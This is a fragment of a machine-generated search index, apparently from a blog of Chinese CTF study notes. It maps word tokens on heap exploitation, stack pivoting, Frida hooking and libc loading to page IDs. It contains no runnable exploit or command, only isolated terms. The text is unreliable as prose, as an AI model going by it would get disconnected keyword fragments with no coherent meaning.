1}}],[\"触发\",{\"1\":{\"12\":1}}],[\"这特别有用于处理非标准格式的数据\",{\"1\":{\"81\":1}}],[\"这意味着\",{\"1\":{\"81\":1}}],[\"这对于文本解析\",{\"1\":{\"81\":1}}],[\"这两个就比较重要了\",{\"1\":{\"66\":1}}],[\"这是一个简化的示例\",{\"1\":{\"44\":1}}],[\"这是函数的调用约定所以当我们执行完后read函数后\",{\"1\":{\"25\":1}}],[\"这题存在off\",{\"1\":{\"37\":1}}],[\"这样机制会优先去寻找unsortedbin来切割出一个更小的chunk\",{\"1\":{\"71\":1}}],[\"这样就完成了脱链操作\",{\"1\":{\"65\":1}}],[\"这样就可以实现栈的移动\",{\"1\":{\"25\":1}}],[\"这样在远程服务器的时候就可以利用这个偏移获取libc基地址\",{\"1\":{\"30\":1}}],[\"这个函数必须返回一个\",{\"1\":{\"88\":1}}],[\"这个函数第一个参数就是我们要遍历的类随后我们放入一个类似于回调函数的对象进去这个对象包含\",{\"1\":{\"13\":1}}],[\"这个变量将被填充为新创建线程的线程id\",{\"1\":{\"88\":1}}],[\"这个unsortedbin的chunk的大小就会被清空\",{\"1\":{\"70\":1}}],[\"这个构造等于payload的长度\",{\"1\":{\"66\":1}}],[\"这个参数\",{\"1\":{\"46\":1}}],[\"这个数组到底是怎么存放数据的\",{\"1\":{\"35\":1}}],[\"这个是存size的\",{\"1\":{\"35\":1}}],[\"这个寄存器是存入的我们下一条执行的指令地址\",{\"1\":{\"25\":1}}],[\"这个指令\",{\"1\":{\"25\":1}}],[\"这个操作\",{\"1\":{\"25\":1}}],[\"这个操作之前的栈结构\",{\"1\":{\"25\":1}}],[\"这个key对应的value也是一个callback函数\",{\"1\":{\"13\":1}}],[\"这个key对应的value是一个callback函数\",{\"1\":{\"13\":1}}],[\"这个方法有什么用呢\",{\"1\":{\"12\":1}}],[\"这里举列子\",{\"0\":{\"82\":1}}],[\"这里提到ifs作为shell的内置变量\",{\"1\":{\"80\":1}}],[\"这里old\",{\"1\":{\"77\":1}}],[\"这里主要是学习一下程序在查找libc的时候的顺序\",{\"1\":{\"74\":1}}],[\"这里主要是绕过unlink\",{\"1\":{\"66\":1}}],[\"这里就是检查bk是否等于tcache\",{\"1\":{\"63\":1}}],[\"这里就是pop\",{\"1\":{\"25\":1}}],[\"这里原文章讲特别好\",{\"1\":{\"51\":1}}],[\"这里写了一个大概的源码\",{\"1\":{\"44\":1}}],[\"这里写个小插曲\",{\"1\":{\"24\":1}}],[\"这里相当于\",{\"1\":{\"44\":1}}],[\"这里相当于让前后的chunk连接起来了\",{\"1\":{\"39\":1}}],[\"这里等效为\",{\"1\":{\"39\":1}}],[\"这里很关键因为会检查前后chunk中\",{\"1\":{\"39\":1}}],[\"这里很多前提知识\",{\"1\":{\"14\":1}}],[\"这里我们动调发现value的值在xor第三次的时候就终止了\",{\"1\":{\"91\":1}}],[\"这里我们假设解析后的地址已经由\",{\"1\":{\"44\":1}}],[\"这里我们不对plt和got表内详细内容进行介绍了\",{\"1\":{\"44\":1}}],[\"这里我们就得到了偏移\",{\"1\":{\"30\":1}}],[\"这里我们拿到包名字\",{\"1\":{\"18\":1}}],[\"这里tcache\",{\"1\":{\"29\":1}}],[\"这里需要注意eip这个寄存器很特殊\",{\"1\":{\"25\":1}}],[\"这里是执行mov\",{\"1\":{\"25\":1}}],[\"这里说一下我自己的浅薄理解\",{\"1\":{\"25\":1}}],[\"这里好好学一下栈迁移这个知识点\",{\"1\":{\"23\":1}}],[\"这里放不下\",{\"1\":{\"19\":1}}],[\"这里搜了去\",{\"1\":{\"19\":1}}],[\"这里看教程大概就是\",{\"1\":{\"18\":1}}],[\"这里学习到的\",{\"1\":{\"16\":1}}],[\"这里如果这个函数不是导出函数则我们通过偏移来获取这个函数这个步骤\",{\"1\":{\"15\":1}}],[\"这里会去找到程序中所有实现了指定类的对象\",{\"1\":{\"13\":1}}],[\"这里先解释一下什么是构造方法java中类在定义的时候\",{\"1\":{\"12\":1}}],[\"这里重载函数是java里面的一个特性\",{\"1\":{\"11\":1}}],[\"这里引用一下参考文章的列子\",{\"1\":{\"9\":1}}],[\"这里也可以在启动后再\",{\"1\":{\"6\":1}}],[\"这里的存储数据为0xc7df9b0041348000\",{\"1\":{\"85\":1}}],[\"这里的fd\",{\"1\":{\"66\":1}}],[\"这里的function\",{\"1\":{\"46\":1}}],[\"这里的字段指的是类中定义的成员属性然后这里修改非静态的字段用到的是java\",{\"1\":{\"13\":1}}],[\"这里的\",{\"1\":{\"6\":1}}],[\"粗鄙理解\",{\"1\":{\"12\":1}}],[\"打印参数个数\",{\"1\":{\"11\":1}}],[\"重复上一次搜索\",{\"1\":{\"79\":2}}],[\"重要知识点\",{\"0\":{\"27\":1}}],[\"重载方法的个数\",{\"1\":{\"11\":1}}],[\"重写add方法\",{\"1\":{\"9\":1}}],[\"不清空屏幕\",{\"1\":{\"79\":1}}],[\"不折行长行\",{\"1\":{\"79\":1}}],[\"不太稳定\",{\"1\":{\"77\":1}}],[\"不去修改p\",{\"1\":{\"58\":1}}],[\"不大于\",{\"1\":{\"27\":1}}],[\"不同的参数列表\",{\"1\":{\"11\":1}}],[\"不管是实例方法还是静态方法都可以\",{\"1\":{\"9\":1}}],[\"nx\",{\"1\":{\"84\":2}}],[\"nssctf\",{\"0\":{\"96\":1},\"1\":{\"84\":1,\"86\":1}}],[\"nl命令\",{\"1\":{\"79\":1}}],[\"nc签到题\",{\"0\":{\"78\":1}}],[\"n添加index为\",{\"1\":{\"70\":1,\"71\":1}}],[\"n删除index为\",{\"1\":{\"70\":1,\"71\":1}}],[\"ntustisc\",{\"0\":{\"52\":1,\"62\":1}}],[\"n\",{\"1\":{\"33\":2,\"44\":1,\"46\":2,\"70\":8,\"71\":8,\"79\":5,\"85\":2,\"86\":1,\"90\":4,\"91\":37,\"92\":29}}],[\"null漏洞\",{\"1\":{\"37\":1}}],[\"null\",{\"1\":{\"29\":1,\"60\":2,\"63\":1,\"65\":2,\"88\":2}}],[\"num2\",{\"1\":{\"33\":1}}],[\"numbers\",{\"1\":{\"79\":1}}],[\"number\",{\"1\":{\"13\":7,\"84\":1,\"86\":1}}],[\"num\",{\"1\":{\"11\":1,\"31\":1,\"32\":1,\"33\":4,\"54\":2}}],[\"nextchunk\",{\"1\":{\"66\":1}}],[\"nextsize这几个组成\",{\"1\":{\"50\":1}}],[\"nextsize\",{\"1\":{\"50\":1,\"65\":23}}],[\"next8\",{\"1\":{\"35\":1}}],[\"next12\",{\"1\":{\"35\":1}}],[\"next\",{\"1\":{\"29\":1,\"33\":1,\"39\":1,\"60\":1,\"65\":1,\"66\":2,\"70\":3,\"71\":3}}],[\"needed\",{\"1\":{\"77\":1}}],[\"need\",{\"1\":{\"19\":1,\"21\":1}}],[\"netease\",{\"1\":{\"18\":1,\"19\":5,\"21\":1}}],[\"newthread\",{\"1\":{\"89\":3}}],[\"new\",{\"1\":{\"12\":2,\"77\":2}}],[\"nativepointer\",{\"1\":{\"15\":1}}],[\"name获取我们需要的函数名字在\",{\"1\":{\"46\":1}}],[\"name就是我们需要的函数名了\",{\"1\":{\"46\":1}}],[\"name=\",{\"1\":{\"15\":1}}],[\"name\",{\"1\":{\"12\":1,\"13\":5,\"14\":4,\"15\":1,\"19\":6,\"35\":1,\"46\":5,\"76\":1,\"77\":2,\"79\":2}}],[\"name来调用原本的函数\",{\"1\":{\"10\":1}}],[\"nickname+\",{\"1\":{\"13\":1}}],[\"nickname\",{\"1\":{\"13\":4}}],[\"noutput\",{\"1\":{\"92\":1}}],[\"noreturn\",{\"1\":{\"90\":1}}],[\"node5\",{\"1\":{\"86\":1}}],[\"nomask\",{\"1\":{\"65\":1}}],[\"not\",{\"1\":{\"60\":2,\"63\":1,\"65\":1}}],[\"note\",{\"1\":{\"29\":1}}],[\"no\",{\"1\":{\"6\":3,\"19\":3,\"79\":1,\"84\":2}}],[\"=>\",{\"1\":{\"77\":1}}],[\"==>之前\",{\"1\":{\"77\":1}}],[\"==\",{\"1\":{\"39\":4,\"60\":2,\"63\":2,\"65\":2,\"66\":2,\"84\":1}}],[\"=\",{\"1\":{\"9\":1,\"11\":1,\"12\":2,\"13\":4,\"14\":2,\"19\":4,\"25\":1,\"29\":1,\"33\":5,\"39\":13,\"46\":6,\"60\":19,\"63\":5,\"65\":20,\"66\":8,\"70\":16,\"71\":16,\"78\":4,\"84\":1,\"85\":2,\"86\":3,\"89\":3,\"91\":2,\"92\":6}}],[\"=function\",{\"1\":{\"9\":1,\"10\":1}}],[\"获取数据\",{\"1\":{\"85\":1}}],[\"获取结果\",{\"1\":{\"85\":1}}],[\"获取目前程序的ld和libc的路径信息\",{\"1\":{\"76\":1}}],[\"获取linux加载程序的流程\",{\"1\":{\"73\":1}}],[\"获取了chunk2然后此时链表\",{\"1\":{\"60\":1}}],[\"获取fastbin的位置\",{\"1\":{\"56\":1}}],[\"获取fd与bk\",{\"1\":{\"39\":1}}],[\"获取对应大小的fastbin然后获取位置\",{\"1\":{\"57\":1}}],[\"获取对应大小的fastbin\",{\"1\":{\"56\":1}}],[\"获取包名\",{\"0\":{\"18\":1}}],[\"获取类的所有方法\",{\"1\":{\"14\":1}}],[\"获取某个重载函数的全部数量\",{\"1\":{\"11\":1}}],[\"获取java类\",{\"1\":{\"9\":1,\"11\":2,\"12\":1,\"13\":1}}],[\"获取指定的java类\",{\"0\":{\"9\":1}}],[\"<pthread\",{\"1\":{\"88\":1}}],[\"<main+62>\",{\"1\":{\"85\":1}}],[\"<method>\",{\"1\":{\"9\":1,\"10\":2}}],[\"<=\",{\"1\":{\"60\":2,\"89\":2,\"91\":1}}],[\"<=>\",{\"1\":{\"39\":6}}],[\"<stdio\",{\"1\":{\"33\":1,\"92\":1}}],[\"<应用标识符>\",{\"1\":{\"21\":1}}],[\"<\",{\"1\":{\"19\":1,\"33\":2,\"63\":2,\"78\":1,\"85\":1,\"92\":1}}],[\"<function>\",{\"1\":{\"11\":1}}],[\"<class>\",{\"1\":{\"11\":1}}],[\"<wrapper>\",{\"1\":{\"9\":1,\"10\":1}}],[\"j\",{\"1\":{\"89\":4}}],[\"join\",{\"1\":{\"88\":3,\"89\":1}}],[\"jollywing\",{\"1\":{\"73\":1}}],[\"jrs\",{\"1\":{\"78\":1}}],[\"jmp\",{\"1\":{\"44\":4}}],[\"just\",{\"1\":{\"29\":1}}],[\"jailed\",{\"1\":{\"19\":1,\"21\":1}}],[\"java会自动给你补上\",{\"1\":{\"12\":1}}],[\"java\",{\"1\":{\"9\":2,\"13\":2,\"14\":1,\"19\":3}}],[\"js代码\",{\"1\":{\"11\":1}}],[\"js代码的书写\",{\"0\":{\"7\":1}}],[\"js\",{\"1\":{\"6\":2,\"19\":2}}],[\"js脚本\",{\"0\":{\"5\":1}}],[\"ls\",{\"1\":{\"78\":1}}],[\"ld当前绑定地址\",{\"1\":{\"76\":1}}],[\"ldd\",{\"1\":{\"76\":2}}],[\"ld的作用\",{\"1\":{\"75\":1}}],[\"ld\",{\"0\":{\"77\":1},\"1\":{\"73\":2,\"74\":1,\"77\":1}}],[\"little\",{\"1\":{\"84\":1}}],[\"line=\",{\"1\":{\"82\":1}}],[\"lines=\",{\"1\":{\"79\":1}}],[\"lines\",{\"1\":{\"79\":1}}],[\"line\",{\"1\":{\"79\":1}}],[\"linux中常用的指令\",{\"0\":{\"79\":1}}],[\"linux程序加载简化流程\",{\"0\":{\"75\":1}}],[\"linux下程序的加载\",{\"1\":{\"73\":1}}],[\"linux\",{\"1\":{\"73\":1,\"77\":1}}],[\"linux动态链接库的加载顺序\",{\"1\":{\"73\":1}}],[\"link\",{\"1\":{\"44\":1,\"45\":1,\"60\":1}}],[\"linked\",{\"1\":{\"29\":1,\"39\":1,\"65\":2,\"66\":1}}],[\"list\",{\"1\":{\"29\":1,\"39\":1,\"65\":2,\"66\":1}}],[\"lib中寻找\",{\"1\":{\"74\":1}}],[\"lib寻找\",{\"1\":{\"74\":1}}],[\"libray\",{\"1\":{\"74\":1}}],[\"library\",{\"1\":{\"74\":1}}],[\"libraries里面开新的空间\",{\"1\":{\"48\":1}}],[\"libary\",{\"1\":{\"74\":3}}],[\"libc就是ldd查到的那个ld地址\",{\"1\":{\"77\":1}}],[\"libc版本2\",{\"1\":{\"67\":1}}],[\"libc\",{\"0\":{\"77\":1},\"1\":{\"63\":1,\"77\":4}}],[\"libc基地址0x7f566bb4f000=偏移0x3ac78\",{\"1\":{\"30\":1}}],[\"libcbaseaddr\",{\"1\":{\"15\":1}}],[\"lib\",{\"1\":{\"15\":1,\"77\":1}}],[\"libnative\",{\"1\":{\"15\":1}}],[\"less\",{\"1\":{\"79\":6}}],[\"less命令\",{\"1\":{\"79\":1}}],[\"len\",{\"1\":{\"70\":2,\"71\":2}}],[\"length\",{\"1\":{\"11\":3,\"14\":1,\"19\":1}}],[\"let\",{\"1\":{\"60\":1,\"84\":1,\"86\":1}}],[\"leave指令\",{\"1\":{\"25\":1}}],[\"leave|ret\",{\"1\":{\"24\":1}}],[\"leaver\",{\"1\":{\"15\":1}}],[\"lang\",{\"1\":{\"13\":1}}],[\"layout\",{\"1\":{\"0\":2}}],[\"long\",{\"1\":{\"79\":3}}],[\"locked\",{\"1\":{\"60\":3}}],[\"lock\",{\"1\":{\"60\":8}}],[\"local\",{\"1\":{\"19\":1}}],[\"location\",{\"1\":{\"19\":1,\"21\":1}}],[\"low\",{\"1\":{\"29\":1}}],[\"logger\",{\"1\":{\"13\":1}}],[\"log\",{\"1\":{\"9\":1,\"11\":2,\"13\":3,\"14\":3,\"15\":2,\"19\":3}}],[\"load\",{\"1\":{\"6\":1}}],[\"l\",{\"1\":{\"6\":1,\"19\":2}}],[\"启动并且附带脚本\",{\"1\":{\"6\":1}}],[\"附着脚本\",{\"0\":{\"6\":1}}],[\"up\",{\"1\":{\"33\":1}}],[\"unsafeunlink\",{\"0\":{\"66\":1}}],[\"unsigned\",{\"1\":{\"60\":2,\"92\":1}}],[\"unsortedbin在合并的时候\",{\"1\":{\"65\":1}}],[\"unsortedbin\",{\"0\":{\"64\":1}}],[\"unsortedbin头结点\",{\"1\":{\"30\":1}}],[\"unsorted\",{\"1\":{\"28\":1,\"30\":1,\"51\":1,\"69\":2}}],[\"unsortbin的fd和bk指向自身main\",{\"1\":{\"27\":1}}],[\"unlikely\",{\"1\":{\"63\":2}}],[\"unlink\",{\"1\":{\"38\":2,\"65\":1}}],[\"unlink+offbynull\",{\"0\":{\"34\":1}}],[\"unlock\",{\"1\":{\"60\":1}}],[\"unr4v31\",{\"1\":{\"45\":1}}],[\"unrecognized\",{\"1\":{\"19\":1}}],[\"unable\",{\"1\":{\"21\":1}}],[\"usr\",{\"1\":{\"74\":1}}],[\"usage\",{\"1\":{\"19\":1}}],[\"users\",{\"1\":{\"19\":1}}],[\"use\",{\"1\":{\"0\":1,\"9\":2,\"11\":2,\"12\":1,\"13\":1,\"14\":1,\"19\":1,\"60\":1}}],[\"u\",{\"1\":{\"3\":1,\"6\":2,\"19\":1}}],[\"映射端口\",{\"0\":{\"2\":1}}],[\"||\",{\"1\":{\"39\":1,\"60\":3,\"65\":2,\"66\":1}}],[\"|\",{\"1\":{\"1\":1,\"19\":7}}],[\"create\",{\"1\":{\"88\":3,\"89\":4}}],[\"cn\",{\"1\":{\"86\":1}}],[\"cnblogs\",{\"1\":{\"45\":1,\"73\":1}}],[\"cp\",{\"1\":{\"84\":1}}],[\"ctf\",{\"1\":{\"84\":1}}],[\"cdecl\",{\"1\":{\"85\":1}}],[\"cd\",{\"1\":{\"78\":1}}],[\"cycles\",{\"1\":{\"63\":1}}],[\"csize2tidx\",{\"1\":{\"63\":1}}],[\"csdn博客获取程序寻找libc的顺序\",{\"1\":{\"73\":1}}],[\"csdn博客和man\",{\"1\":{\"73\":1}}],[\"csdn博客\",{\"1\":{\"28\":1,\"47\":1}}],[\"csdn博客推荐下载书的网站\",{\"1\":{\"1\":1}}],[\"case\",{\"1\":{\"79\":1,\"92\":4}}],[\"cat命令\",{\"1\":{\"79\":1}}],[\"cat\",{\"1\":{\"78\":1,\"84\":1}}],[\"catomic\",{\"1\":{\"60\":1}}],[\"canary\",{\"1\":{\"84\":1}}],[\"can\",{\"1\":{\"60\":1}}],[\"call\",{\"1\":{\"44\":1,\"85\":1}}],[\"cache\",{\"1\":{\"29\":1}}],[\"cherry\",{\"1\":{\"82\":2}}],[\"check\",{\"1\":{\"60\":3,\"63\":1}}],[\"chop\",{\"1\":{\"79\":1}}],[\"choice\",{\"1\":{\"70\":1,\"71\":1}}],[\"choose\",{\"1\":{\"13\":1}}],[\"choose函数\",{\"1\":{\"13\":1}}],[\"chance\",{\"1\":{\"63\":1}}],[\"chars\",{\"1\":{\"79\":1}}],[\"char\",{\"1\":{\"29\":1,\"35\":1,\"84\":1,\"85\":2,\"89\":2,\"90\":2,\"91\":1,\"92\":1}}],[\"chunk然后再去寻找unsorted\",{\"1\":{\"70\":1}}],[\"chunk有大小合适的\",{\"1\":{\"70\":1}}],[\"chunk前\",{\"1\":{\"70\":1}}],[\"chunk挡在top\",{\"1\":{\"70\":1}}],[\"chunk相邻会被直接合并\",{\"1\":{\"70\":1}}],[\"chunk而且这个free\",{\"1\":{\"66\":1}}],[\"chunk会被当做free\",{\"1\":{\"66\":1}}],[\"chunk进行一个拖链操作\",{\"1\":{\"65\":1}}],[\"chunk里面\",{\"1\":{\"64\":1}}],[\"chunk则合并到top\",{\"1\":{\"64\":1}}],[\"chunk就合并\",{\"1\":{\"64\":1}}],[\"chunk2mem\",{\"1\":{\"60\":1,\"63\":1}}],[\"chunk2那么chunk2的fd指向chunk1就会变成\",{\"1\":{\"60\":1}}],[\"chunk的时候\",{\"1\":{\"70\":1}}],[\"chunk的size\",{\"1\":{\"70\":1,\"71\":1}}],[\"chunk的起始位置是根据prev\",{\"1\":{\"66\":1}}],[\"chunk的利用\",{\"1\":{\"66\":1}}],[\"chunk的mem\",{\"1\":{\"59\":1}}],[\"chunk的bk是一串随机的安全数\",{\"1\":{\"59\":1}}],[\"chunk的chunk\",{\"1\":{\"28\":1,\"58\":1}}],[\"chunk出链\",{\"1\":{\"57\":1}}],[\"chunk中找\",{\"1\":{\"51\":3}}],[\"chunk中申请\",{\"1\":{\"50\":1}}],[\"chunk实在不够才会去调用brk函数申请空间\",{\"1\":{\"50\":1}}],[\"chunk常见的就是携带fd\",{\"1\":{\"50\":1}}],[\"chunk结构\",{\"0\":{\"50\":1}}],[\"chunksize\",{\"1\":{\"39\":1,\"60\":3,\"65\":2,\"66\":1}}],[\"chunk分析\",{\"0\":{\"36\":1}}],[\"chunk可以占用下一个chunk的prev\",{\"1\":{\"32\":1}}],[\"chunk一定是size\",{\"1\":{\"32\":1}}],[\"chunk\",{\"1\":{\"27\":2,\"33\":1,\"39\":2,\"50\":4,\"51\":1,\"57\":1,\"60\":7,\"65\":2,\"66\":3,\"70\":17,\"71\":17}}],[\"c2018\",{\"0\":{\"26\":1}}],[\"c\",{\"1\":{\"19\":1,\"52\":1,\"79\":2,\"92\":1}}],[\"clz\",{\"1\":{\"19\":2}}],[\"clz=java\",{\"1\":{\"14\":1}}],[\"classes\",{\"1\":{\"14\":3}}],[\"classes=java\",{\"1\":{\"14\":1}}],[\"class\",{\"1\":{\"11\":1,\"12\":2,\"13\":1,\"14\":1,\"19\":2,\"70\":1,\"71\":1}}],[\"classname\",{\"1\":{\"9\":1}}],[\"coincidence\",{\"1\":{\"63\":2}}],[\"corruption\",{\"1\":{\"60\":1}}],[\"corrupted\",{\"1\":{\"39\":2,\"65\":3,\"66\":2}}],[\"code\",{\"1\":{\"33\":1,\"92\":2}}],[\"count\",{\"1\":{\"63\":1}}],[\"counted\",{\"1\":{\"29\":1}}],[\"counts\",{\"1\":{\"29\":2}}],[\"counts代表着每个bin当前所有的chunk数量\",{\"1\":{\"29\":1}}],[\"could\",{\"1\":{\"29\":1}}],[\"const\",{\"1\":{\"85\":2,\"88\":1}}],[\"consolidate\",{\"0\":{\"65\":1}}],[\"console\",{\"1\":{\"9\":1,\"11\":2,\"13\":2,\"14\":3,\"15\":2,\"19\":3}}],[\"concurrent\",{\"1\":{\"60\":1}}],[\"control\",{\"1\":{\"79\":1}}],[\"content是否为空去判断的\",{\"1\":{\"36\":1}}],[\"content是否为空去编辑的\",{\"1\":{\"36\":1}}],[\"content中写入内容\",{\"1\":{\"36\":1}}],[\"content被清空\",{\"1\":{\"36\":1}}],[\"content的时候malloc\",{\"1\":{\"36\":1}}],[\"content的内容\",{\"1\":{\"35\":1}}],[\"content\",{\"1\":{\"35\":1,\"70\":3,\"71\":3}}],[\"contains\",{\"1\":{\"29\":1}}],[\"connect\",{\"1\":{\"21\":1}}],[\"connected\",{\"1\":{\"19\":1}}],[\"configuration\",{\"1\":{\"0\":1}}],[\"command\",{\"1\":{\"78\":3}}],[\"commands\",{\"1\":{\"19\":1}}],[\"compare\",{\"1\":{\"60\":1}}],[\"com\",{\"1\":{\"9\":1,\"11\":2,\"12\":1,\"13\":2,\"14\":2,\"18\":1,\"19\":4,\"21\":1,\"38\":1,\"44\":1,\"45\":1,\"52\":1,\"73\":1}}],[\"pthreads\",{\"1\":{\"88\":1}}],[\"pthread\",{\"1\":{\"88\":11,\"89\":9,\"90\":1}}],[\"ptr\",{\"1\":{\"15\":2,\"70\":4,\"71\":4}}],[\"pie\",{\"1\":{\"84\":2}}],[\"p64\",{\"1\":{\"70\":10,\"71\":10}}],[\"puts\",{\"1\":{\"84\":2}}],[\"put\",{\"1\":{\"63\":1}}],[\"pushq\",{\"1\":{\"44\":3}}],[\"push\",{\"1\":{\"44\":2}}],[\"public\",{\"1\":{\"11\":5,\"12\":4,\"13\":6}}],[\"posts\",{\"0\":{\"94\":1}}],[\"post\",{\"1\":{\"90\":2}}],[\"posix\",{\"1\":{\"88\":1}}],[\"positive\",{\"1\":{\"60\":1}}],[\"point\",{\"1\":{\"35\":4,\"60\":1}}],[\"popq\",{\"1\":{\"44\":3}}],[\"pop操作我们的rsp向下移动一格\",{\"1\":{\"25\":1}}],[\"pop\",{\"1\":{\"25\":3}}],[\"prompt\",{\"1\":{\"79\":2}}],[\"proversion\",{\"1\":{\"78\":1}}],[\"process\",{\"1\":{\"70\":1,\"71\":1}}],[\"probe\",{\"1\":{\"63\":1}}],[\"prctl\",{\"1\":{\"54\":1}}],[\"prev\",{\"1\":{\"33\":1,\"39\":2,\"50\":2,\"65\":2,\"66\":4,\"70\":6,\"71\":6}}],[\"private\",{\"1\":{\"13\":2}}],[\"printerr\",{\"1\":{\"39\":2,\"63\":1,\"65\":3,\"66\":2}}],[\"printemo是根据emo\",{\"1\":{\"36\":1}}],[\"printf\",{\"1\":{\"33\":4,\"85\":2,\"92\":7}}],[\"println\",{\"1\":{\"13\":1}}],[\"printstudent\",{\"1\":{\"13\":1}}],[\"print\",{\"1\":{\"12\":1,\"54\":1,\"70\":12,\"71\":11,\"78\":2,\"85\":1,\"86\":1,\"91\":1}}],[\"perturb\",{\"1\":{\"60\":1}}],[\"perthread\",{\"1\":{\"29\":5,\"59\":1}}],[\"per\",{\"1\":{\"29\":1}}],[\"performance\",{\"1\":{\"29\":1}}],[\"perform\",{\"1\":{\"8\":1,\"9\":1,\"19\":1}}],[\"plt>\",{\"1\":{\"85\":1}}],[\"plt存我们需要\",{\"1\":{\"46\":1}}],[\"plt这个数组的下标\",{\"1\":{\"46\":1}}],[\"plt这里\",{\"1\":{\"25\":1}}],[\"plt\",{\"1\":{\"25\":1,\"44\":3,\"46\":4,\"85\":1}}],[\"please\",{\"1\":{\"0\":1}}],[\"pwn1\",{\"0\":{\"84\":1},\"1\":{\"84\":2,\"86\":1}}],[\"pwn3阅读笔记\",{\"0\":{\"62\":1}}],[\"pwngdb的话直接输入tls也可以查到\",{\"1\":{\"54\":1}}],[\"pwn\",{\"0\":{\"52\":1,\"95\":1},\"1\":{\"24\":1,\"38\":1,\"47\":2,\"70\":1,\"71\":1,\"84\":1,\"86\":1}}],[\"p\",{\"1\":{\"21\":1,\"38\":2,\"39\":26,\"60\":11,\"63\":2,\"65\":25,\"66\":9}}],[\"partial\",{\"1\":{\"84\":1}}],[\"patchelf\",{\"1\":{\"77\":3}}],[\"path程序加载运行期间查找动态链接库的路径\",{\"1\":{\"74\":1}}],[\"path这个变量是程序编译期间查找动态链接库时指定查找共享库的路径\",{\"1\":{\"74\":1}}],[\"path\",{\"1\":{\"74\":1}}],[\"path也不会起效果\",{\"1\":{\"74\":1}}],[\"path所以当程序由runpath后我们就算修改ld\",{\"1\":{\"74\":1}}],[\"payload的长度+1\",{\"1\":{\"66\":1}}],[\"payload\",{\"0\":{\"83\":1},\"1\":{\"63\":1,\"70\":4,\"71\":4,\"86\":2}}],[\"package\",{\"1\":{\"12\":1}}],[\"pause意思是在程序启动后不要停止程序的进程\",{\"1\":{\"6\":1}}],[\"pause\",{\"1\":{\"6\":2,\"19\":3}}],[\"page\",{\"1\":{\"0\":2}}],[\"ps\",{\"1\":{\"3\":1}}],[\"pc查询手机的进程\",{\"0\":{\"3\":1}}],[\"dd\",{\"1\":{\"85\":1}}],[\"data\",{\"1\":{\"63\":2}}],[\"dup\",{\"0\":{\"60\":1,\"63\":1}}],[\"dynsym中哪个结构体\",{\"1\":{\"46\":1}}],[\"dynsym存函数名字在\",{\"1\":{\"46\":1}}],[\"dynsym\",{\"1\":{\"46\":2}}],[\"dynsym这个数组的下标\",{\"1\":{\"46\":1}}],[\"dynstr中的位置\",{\"1\":{\"46\":1}}],[\"dynstr存函数名字\",{\"1\":{\"46\":1}}],[\"dynstr数组中的下标\",{\"1\":{\"46\":1}}],[\"dynstr\",{\"1\":{\"46\":2}}],[\"dynamic\",{\"1\":{\"19\":1}}],[\"dl\",{\"0\":{\"45\":1},\"1\":{\"44\":20,\"45\":2}}],[\"done\",{\"1\":{\"82\":1}}],[\"don\",{\"1\":{\"63\":2}}],[\"do\",{\"1\":{\"60\":1,\"82\":1}}],[\"double\",{\"1\":{\"39\":1,\"60\":2,\"63\":3,\"65\":2,\"66\":1}}],[\"docs\",{\"1\":{\"0\":1,\"19\":1}}],[\"dword\",{\"1\":{\"35\":2,\"85\":1}}],[\"display\",{\"1\":{\"19\":1}}],[\"displays\",{\"1\":{\"19\":1}}],[\"dick\",{\"1\":{\"12\":2}}],[\"dest\",{\"1\":{\"91\":37}}],[\"dest3\",{\"1\":{\"89\":1,\"92\":3}}],[\"dest2\",{\"1\":{\"89\":1,\"92\":3}}],[\"dest1\",{\"1\":{\"89\":1,\"92\":3}}],[\"dest0\",{\"1\":{\"89\":1,\"90\":1,\"92\":3}}],[\"debug\",{\"1\":{\"70\":1,\"71\":1,\"86\":1}}],[\"delete\",{\"1\":{\"68\":1,\"70\":2,\"71\":2}}],[\"delete函数\",{\"1\":{\"68\":1}}],[\"detected\",{\"1\":{\"63\":1}}],[\"deallocated\",{\"1\":{\"60\":1}}],[\"dereference\",{\"1\":{\"60\":1}}],[\"def\",{\"1\":{\"70\":7,\"71\":7}}],[\"define\",{\"1\":{\"38\":1}}],[\"default\",{\"1\":{\"19\":1,\"21\":1,\"92\":1}}],[\"demo\",{\"1\":{\"0\":1}}],[\"d\",{\"1\":{\"13\":1,\"92\":4}}],[\"feifei\",{\"1\":{\"90\":1}}],[\"few\",{\"1\":{\"63\":1}}],[\"found\",{\"1\":{\"84\":1}}],[\"format\",{\"1\":{\"85\":1}}],[\"forward\",{\"1\":{\"2\":1}}],[\"for\",{\"1\":{\"0\":1,\"11\":1,\"14\":2,\"19\":1,\"29\":2,\"60\":1,\"63\":1,\"70\":3,\"71\":2,\"78\":1,\"82\":1,\"89\":2,\"91\":1,\"92\":2}}],[\"flag\",{\"1\":{\"84\":1,\"92\":10}}],[\"flags\",{\"1\":{\"13\":1}}],[\"float\",{\"1\":{\"84\":1,\"85\":2}}],[\"fb\",{\"1\":{\"60\":5}}],[\"fs\",{\"0\":{\"54\":1}}],[\"file\",{\"1\":{\"76\":1,\"77\":3,\"79\":8}}],[\"fixup\",{\"1\":{\"44\":11}}],[\"fixup然后这个函数将真实的地址返回给rax寄存器\",{\"1\":{\"44\":1}}],[\"findbaseaddress\",{\"1\":{\"15\":1}}],[\"fd和bk都被清空了\",{\"1\":{\"70\":1}}],[\"fd和bk\",{\"1\":{\"66\":1}}],[\"fd指向的是\",{\"1\":{\"59\":1}}],[\"fd指向下一个free\",{\"1\":{\"58\":1}}],[\"fd或者bk\",{\"1\":{\"39\":1}}],[\"fd\",{\"1\":{\"38\":2,\"39\":5,\"50\":2,\"65\":13,\"66\":4,\"70\":3,\"71\":3}}],[\"fflush\",{\"1\":{\"33\":1}}],[\"false\",{\"1\":{\"60\":1}}],[\"fastcall\",{\"1\":{\"89\":1,\"90\":1}}],[\"fastchunks\",{\"1\":{\"60\":1}}],[\"fasttop\",{\"1\":{\"60\":1}}],[\"fastbin\",{\"0\":{\"58\":1,\"60\":1},\"1\":{\"56\":1,\"60\":9}}],[\"fastbin最小结构为0x20\",{\"1\":{\"50\":1}}],[\"fast的chunk或者fast\",{\"1\":{\"27\":1}}],[\"fast\",{\"1\":{\"27\":2,\"50\":1,\"51\":1,\"56\":1,\"60\":1}}],[\"fakechunk\",{\"1\":{\"70\":2,\"71\":2}}],[\"fakeunlink\",{\"1\":{\"66\":1}}],[\"fake\",{\"1\":{\"25\":1,\"70\":3,\"71\":3}}],[\"failed\",{\"1\":{\"19\":1}}],[\"fun=new\",{\"1\":{\"15\":1}}],[\"func\",{\"1\":{\"15\":1,\"84\":1}}],[\"func=parseint\",{\"1\":{\"15\":1}}],[\"function\",{\"1\":{\"8\":1,\"9\":2,\"10\":1,\"11\":2,\"12\":1,\"13\":3,\"14\":3